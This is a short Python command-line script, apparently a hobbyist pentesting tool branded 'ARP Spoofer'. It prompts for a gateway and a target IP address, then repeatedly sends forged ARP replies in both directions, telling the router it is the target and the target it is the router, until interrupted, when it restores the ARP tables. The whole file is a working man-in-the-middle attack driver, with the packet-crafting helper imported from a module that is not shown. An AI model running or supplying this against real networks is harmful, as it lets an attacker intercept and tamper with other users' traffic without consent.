#!/usr/bin/env python

import time
import sys
import net_lib as nl
import subprocess

print("[+] Run The Application as ROOT.")
subprocess.call(["clear ; figlet ARP Spoofer"], shell=True)
print("\t\t\t\t\t\tA script by SHADOW\n====================================================================\n\n")


try:
    gateway_ip = raw_input("Enter gateway IP Address: ")
    target_ip = raw_input("Enter target IP Address: ")

    try:
        sent_packet_count = 0
        while True:
            nl.spoof_arp(gateway_ip, target_ip)     #   tell router i am the target
            nl.spoof_arp(target_ip, gateway_ip)     #   tell target i am the router

            sent_packet_count = sent_packet_count + 2
            print("\r[+] Packet sent: " + str(sent_packet_count)),
            sys.stdout.flush()

            time.sleep(2)

    except KeyboardInterrupt:
        print("\n\n[-] Ctrl+C detected! Restoring ARP....Please wait.")

        nl.restore_arp(gateway_ip, target_ip)
        nl.restore_arp(target_ip, gateway_ip)

except KeyboardInterrupt:
    print("\n\n[-] Ctrl+C detected!")
except KeyError:
    print("\n\n[-] Invalid input!")